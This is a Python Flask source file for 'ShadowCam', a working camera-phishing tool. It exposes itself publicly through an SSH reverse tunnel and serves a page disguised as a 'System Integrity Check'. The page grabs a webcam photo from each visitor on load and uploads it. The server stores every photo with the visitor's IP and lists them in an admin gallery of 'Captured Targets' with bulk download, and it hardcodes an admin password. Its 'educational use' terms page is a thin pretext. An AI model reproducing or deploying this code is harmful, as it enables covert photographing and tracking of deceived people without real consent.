import sys
try:
    from flask import Flask, render_template_string, request, jsonify, session, send_file, abort, redirect, url_for
    from flask_wtf.csrf import CSRFProtect
    from PIL import Image
except ImportError as e:
    print(f"Missing dependencies: {e.name}. Install with:")
    print("pip3 install flask==2.3.3 flask-wtf==1.2.1 pillow==10.4.0")
    sys.exit(1)

import os
import base64
from datetime import datetime
import logging
import platform
import io
import secrets
import hashlib
import subprocess
import socket
import zipfile
import tempfile
import pwd
import grp
import uuid
import time
import signal
import re

# Configure logging
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
log_dir = os.path.join(SCRIPT_DIR, "logs")
try:
    os.makedirs(log_dir, exist_ok=True)
except Exception as e:
    print(f"Error creating log directory {log_dir}: {e}")
    sys.exit(1)

logging.basicConfig(
    filename=os.path.join(log_dir, 'app.log'),
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.secret_key = secrets.token_hex(16)
csrf = CSRFProtect(app)

# Hardcoded config
IMAGE_FOLDER = os.path.join(SCRIPT_DIR, "images")
FALLBACK_IMAGE_FOLDER = "/tmp/shadowcam_images"
ADMIN_PASSWORD = "faez123"
ADMIN_PASSWORD_HASH = hashlib.sha256(ADMIN_PASSWORD.encode()).hexdigest()
PORT = 5000
JPEG_QUALITY = 85
VERSION = "1.0.8"
TUNNEL_LOG = os.path.join(log_dir, 'tunnel.log')

# Get local IP
def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception as e:
        logger.warning(f"Failed to detect local IP: {str(e)}")
        return "your-ip"

LOCAL_IP = get_local_ip()

# Validate image folder
def validate_image_folder():
    folders = [IMAGE_FOLDER, FALLBACK_IMAGE_FOLDER]
    selected_folder = None
    for folder in folders:
        try:
            logger.debug(f"Validating image folder: {folder}")
            os.makedirs(folder, exist_ok=True)
            if platform.system() != "Windows":
                os.chmod(folder, 0o755)
                try:
                    uid = pwd.getpwnam(os.getlogin()).pw_uid
                    gid = grp.getgrnam(os.getlogin()).gr_gid
                    os.chown(folder, uid, gid)
                except Exception as e:
                    logger.warning(f"Failed to set ownership for {folder}: {str(e)}")
            test_file = os.path.join(folder, '.test_write.jpg')
            logger.debug(f"Testing write to {test_file}")
            img = Image.new('RGB', (10, 10), color='black')
            img.save(test_file, 'JPEG', quality=JPEG_QUALITY)
            os.remove(test_file)
            logger.debug(f"Validation successful for {folder}")
            selected_folder = folder
            break
        except Exception as e:
            logger.error(f"Failed to validate {folder}: {str(e)}")
    if not selected_folder:
        print(f"Error: Cannot write to {IMAGE_FOLDER} or {FALLBACK_IMAGE_FOLDER}")
        sys.exit(1)
    return selected_folder

IMAGE_FOLDER = validate_image_folder()

# Start tunnel (Serveo or localhost.run)
def start_tunnel(max_retries=5):
    subdomain = input("Enter subdomain (e.g., faezshowcam) or press Enter for random: ").strip()
    if not subdomain:
        subdomain = f"faez-{uuid.uuid4().hex[:8]}"
    logger.info(f"Attempting tunnel with subdomain: {subdomain}")
    print(f"Starting tunnel with subdomain: {subdomain}")

    # Try Serveo with random subdomain
    for attempt in range(max_retries):
        try:
            with open(TUNNEL_LOG, 'a') as f:
                cmd = ["ssh", "-o", "ServerAliveInterval=60", "-o", "StrictHostKeyChecking=no", 
                       "-R", f"80:localhost:{PORT}", "serveo.net"]
                process = subprocess.Popen(
                    cmd,
                    stdout=f,
                    stderr=f,
                    text=True
                )
                time.sleep(15)  # Wait for tunnel
                if process.poll() is not None:
                    with open(TUNNEL_LOG, 'r') as log:
                        error = log.read()
                    logger.error(f"Serveo failed (attempt {attempt+1}): {error}")
                    print(f"Serveo failed (attempt {attempt+1}). Check {TUNNEL_LOG}")
                    continue
                # Parse Serveo URL from log
                with open(TUNNEL_LOG, 'r') as log:
                    output = log.read()
                    url_match = re.search(r'https://[a-z0-9-]+\.serveo\.net', output)
                    if url_match:
                        public_url = url_match.group(0)
                        logger.info(f"Serveo tunnel established: {public_url}")
                        print(f"Public URL: {public_url}")
                        print(f"Share this URL with others. Press Ctrl+C to stop.")
                        return process, public_url, "serveo"
                    else:
                        logger.error(f"Serveo URL not found: {output}")
                        process.terminate()
                        continue
        except Exception as e:
            logger.error(f"Serveo setup failed (attempt {attempt+1}): {str(e)}")
            print(f"Serveo setup failed (attempt {attempt+1}): {str(e)}")
        time.sleep(5)

    # Fallback to localhost.run
    print("Serveo failed. Trying localhost.run...")
    logger.info("Falling back to localhost.run")
    for attempt in range(max_retries):
        try:
            with open(TUNNEL_LOG, 'a') as f:
                cmd = ["ssh", "-o", "StrictHostKeyChecking=no", "-R", f"80:localhost:{PORT}", "localhost.run"]
                process = subprocess.Popen(
                    cmd,
                    stdout=f,
                    stderr=f,
                    text=True
                )
                time.sleep(15)
                with open(TUNNEL_LOG, 'r') as log:
                    output = log.read()
                    url_match = re.search(r'https://[a-z0-9-]+\.lhr\.life', output)
                    if url_match:
                        public_url = url_match.group(0)
                        logger.info(f"localhost.run tunnel established: {public_url}")
                        print(f"Public URL: {public_url}")
                        print(f"Share this URL with others. Press Ctrl+C to stop.")
                        return process, public_url, "localhost.run"
                    else:
                        logger.error(f"localhost.run failed: {output}")
                        print(f"Error: localhost.run failed. Check {TUNNEL_LOG}")
                        process.terminate()
                        continue
        except Exception as e:
            logger.error(f"localhost.run setup failed (attempt {attempt+1}): {str(e)}")
            print(f"Error: localhost.run failed (attempt {attempt+1}): {str(e)}")
        time.sleep(5)

    print(f"Error: Could not establish tunnel. Check {TUNNEL_LOG}")
    sys.exit(1)

# Startup banner
# To swap banner, replace the string below with a new ASCII art block
print(f"""
\033[1;31m
   .-""-.
  /  **  \
 : , ** , :
 : :    : :
 '._:  :_.' 
 > SHADOWCAM v1.0.8 | FAEZ
 > PHANTOM: GHOST MODE
 > PROTOCOL: OWN THE SHADOWS
 > ABORT: CTRL+C
\033[0m
""")

@app.route('/')
def index():
    logger.info(f"Access from {request.remote_addr}, User-Agent: {request.headers.get('User-Agent')}")
    return render_template_string("""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Faez's ShadowCam</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #0d0d0d; color: #00ff00; font-family: 'Courier New', monospace; }
        .container { max-width: 32rem; }
        .error { color: #ff4444; }
        .animate-glitch { 
            animation: glitch 1s linear infinite; 
        }
        @keyframes glitch {
            2%, 64% { transform: translate(2px, 0) skew(0deg); }
            4%, 60% { transform: translate(-2px, 0) skew(0deg); }
            62% { transform: translate(0, 0) skew(5deg); }
        }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen">
    <div class="container mx-auto p-4 text-center">
        <h1 class="text-4xl font-bold mb-4 text-red-600 animate-glitch">Faez's ShadowCam</h1>
        <p class="mb-4">System Integrity Check in Progress...</p>
        <div id="error" class="error hidden mb-4"></div>
        <p class="mt-4 text-sm">By accessing this tool, you agree to our <a href="/terms" class="text-red-400 hover:underline">Terms of Use</a>.</p>
    </div>
    <script>
        async function captureImage() {
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                document.getElementById('error').textContent = 'Camera not supported in this browser.';
                document.getElementById('error').classList.remove('hidden');
                return;
            }

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();

                await new Promise(resolve => video.onloadedmetadata = resolve);

                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);

                const dataUrl = canvas.toDataURL('image/jpeg');

                stream.getTracks().forEach(track => track.stop());

                const response = await fetch('/capture', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ image: dataUrl })
                });
                const result = await response.json();
                if (!result.success) {
                    document.getElementById('error').textContent = 'Error: ' + result.error;
                    document.getElementById('error').classList.remove('hidden');
                }
            } catch (err) {
                document.getElementById('error').textContent = 'Camera error: ' + err.message;
                document.getElementById('error').classList.remove('hidden');
            }
        }

        window.addEventListener('load', () => {
            setTimeout(captureImage, 1000);
        });
    </script>
</body>
</html>
    """, port=PORT, local_ip=LOCAL_IP)

@app.route('/capture', methods=['POST'])
@csrf.exempt
def capture():
    logger.debug(f"Capture request from {request.remote_addr}")
    try:
        data = request.get_json()
        if not data or 'image' not in data:
            logger.error("No image data provided")
            return jsonify({'success': False, 'error': 'No image data provided'}), 400

        logger.debug("Decoding base64 image")
        image_data = data['image'].split(',')[1]
        try:
            image_bytes = base64.b64decode(image_data)
        except Exception as e:
            logger.error(f"Base64 decode failed: {str(e)}")
            return jsonify({'success': False, 'error': 'Invalid image data'}), 400

        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f'image_{timestamp}_{request.remote_addr}.jpg'
        filepath = os.path.join(IMAGE_FOLDER, filename)

        logger.debug(f"Attempting to save image to {filepath}")
        try:
            img = Image.open(io.BytesIO(image_bytes))
            img.save(filepath, 'JPEG', quality=JPEG_QUALITY)
            if platform.system() != "Windows":
                os.chmod(filepath, 0o644)
        except Exception as e:
            logger.error(f"Image save failed: {str(e)}")
            return jsonify({'success': False, 'error': f'Failed to save image: {str(e)}'}), 500

        logger.info(f"Saved image: {filepath}, User-Agent: {request.headers.get('User-Agent')}")
        return jsonify({'success': True})
    except Exception as e:
        logger.error(f"Unexpected error in capture: {str(e)}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/admin', methods=['GET', 'POST'])
def admin():
    if request.method == 'POST':
        password = request.form.get('password', '')
        if hashlib.sha256(password.encode()).hexdigest() == ADMIN_PASSWORD_HASH:
            session['admin'] = True
            return redirect(url_for('admin'))
        else:
            return render_template_string("""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Login</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #0d0d0d; color: #00ff00; font-family: 'Courier New', monospace; }
        .container { max-width: 32rem; }
        .error { color: #ff4444; }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen">
    <div class="container mx-auto p-4 text-center">
        <h1 class="text-3xl font-bold mb-4 text-red-600">Faez's ShadowCam - Admin</h1>
        <p class="error mb-4">Incorrect password</p>
        <form method="POST">
            <input type="password" name="password" placeholder="Enter admin password" class="mb-4 p-2 bg-gray-900 text-green-400 rounded w-full">
            <button type="submit" class="bg-red-600 hover:bg-red-700 text-white font-bold py-2 px-4 rounded">Login</button>
        </form>
    </div>
</body>
</html>
            """)
    if not session.get('admin'):
        return render_template_string("""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Login</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #0d0d0d; color: #00ff00; font-family: 'Courier New', monospace; }
        .container { max-width: 32rem; }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen">
    <div class="container mx-auto p-4 text-center">
        <h1 class="text-3xl font-bold mb-4 text-red-600">Faez's ShadowCam - Admin</h1>
        <form method="POST">
            <input type="password" name="password" placeholder="Enter admin password" class="mb-4 p-2 bg-gray-900 text-green-400 rounded w-full">
            <button type="submit" class="bg-red-600 hover:bg-red-700 text-white font-bold py-2 px-4 rounded">Login</button>
        </form>
    </div>
</body>
</html>
        """)
    images = []
    for filename in sorted(os.listdir(IMAGE_FOLDER)):
        if filename.startswith('image_') and filename.endswith('.jpg'):
            parts = filename.split('_')
            if len(parts) >= 3:
                ip = parts[-1].replace('.jpg', '')
                images.append({'filename': filename, 'ip': ip})
    return render_template_string("""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #0d0d0d; color: #00ff00; font-family: 'Courier New', monospace; }
        .container { max-width: 48rem; }
        .image-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(12rem, 1fr)); gap: 1rem; }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen">
    <div class="container mx-auto p-4">
        <h1 class="text-3xl font-bold mb-4 text-red-600">Faez's ShadowCam - Admin</h1>
        <p class="mb-4">Captured Targets | <a href="/download" class="text-red-400 hover:underline">Download All</a> | <a href="/logout" class="text-red-400 hover:underline">Logout</a></p>
        <div class="image-grid">
            {% for image in images %}
                <div>
                    <a href="/image/{{ image.filename }}" target="_blank">
                        <img src="/image/{{ image.filename }}" alt="Captured Target" class="w-full h-auto rounded-lg shadow-lg">
                    </a>
                    <p class="text-sm mt-2">Target IP: {{ image.ip }}</p>
                </div>
            {% endfor %}
        </div>
    </div>
</body>
</html>
    """, images=images)

@app.route('/logout')
def logout():
    session.pop('admin', None)
    return redirect(url_for('index'))

@app.route('/image/<filename>')
def serve_image(filename):
    filepath = os.path.join(IMAGE_FOLDER, filename)
    if not os.path.exists(filepath) or not session.get('admin'):
        abort(403)
    return send_file(filepath)

@app.route('/download')
def download_images():
    if not session.get('admin'):
        abort(403)
    try:
        temp_file = tempfile.NamedTemporaryFile(delete=False, suffix='.zip')
        with zipfile.ZipFile(temp_file.name, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for filename in os.listdir(IMAGE_FOLDER):
                filepath = os.path.join(IMAGE_FOLDER, filename)
                if os.path.isfile(filepath):
                    zipf.write(filepath, filename)
        return send_file(temp_file.name, as_attachment=True, download_name='targets.zip')
    except Exception as e:
        logger.error(f"Failed to create zip: {str(e)}")
        abort(500)

@app.route('/terms')
def terms():
    return render_template_string("""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Terms of Use</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #0d0d0d; color: #00ff00; font-family: 'Courier New', monospace; }
        .container { max-width: 48rem; }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen">
    <div class="container mx-auto p-4">
        <h1 class="text-3xl font-bold mb-4 text-red-600">Terms of Use</h1>
        <p>This tool is for educational cybersecurity testing only. It requires camera access consent. Images are stored in the tool's images folder and accessible only by the admin.</p>
        <p class="mt-4">Unauthorized use is illegal. Contact Faez for concerns.</p>
    </div>
</body>
</html>
    """)

@app.errorhandler(403)
def forbidden(e):
    return render_template_string("""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>403</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #0d0d0d; color: #00ff00; font-family: 'Courier New', monospace; }
        .container { max-width: 32rem; }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen">
    <div class="container mx-auto p-4 text-center">
        <h1 class="text-4xl font-bold mb-4 text-red-600">403 - Forbidden</h1>
        <p>Access denied. Go back to <a href="/" class="text-red-400 hover:underline">home</a>.</p>
    </div>
</body>
</html>
    """), 403

@app.errorhandler(404)
def page_not_found(e):
    return render_template_string("""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>404</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #0d0d0d; color: #00ff00; font-family: 'Courier New', monospace; }
        .container { max-width: 32rem; }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen">
    <div class="container mx-auto p-4 text-center">
        <h1 class="text-4xl font-bold mb-4 text-red-600">404 - Not Found</h1>
        <p>Page not found. Go back to <a href="/" class="text-red-400 hover:underline">home</a>.</p>
    </div>
</body>
</html>
    """), 404

@app.errorhandler(500)
def internal_error(e):
    logger.error(f"Internal server error: {e}")
    return render_template_string("""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>500</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #0d0d0d; color: #00ff00; font-family: 'Courier New', monospace; }
        .container { max-width: 32rem; }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen">
    <div class="container mx-auto p-4 text-center">
        <h1 class="text-4xl font-bold mb-4 text-red-600">500 - Server Error</h1>
        <p>Something broke. Contact Faez or try again. Go back to <a href="/" class="text-red-400 hover:underline">home</a>.</p>
    </div>
</body>
</html>
    """), 500

if __name__ == '__main__':
    logger.info(f"Starting Faez's ShadowCam v{VERSION} on port {PORT}")
    # Start tunnel
    tunnel_process, public_url, tunnel_type = start_tunnel()
    try:
        logger.info("Starting Flask server with HTTP")
        print(f"Local access: http://localhost:{PORT}")
        print(f"Public access: {public_url}")
        app.run(host='0.0.0.0', port=PORT)
    except Exception as e:
        logger.error(f"Failed to start Flask server: {str(e)}")
        print(f"Error: Failed to start Flask server: {str(e)}")
    finally:
        logger.info(f"Shutting down {tunnel_type} tunnel")
        tunnel_process.terminate()
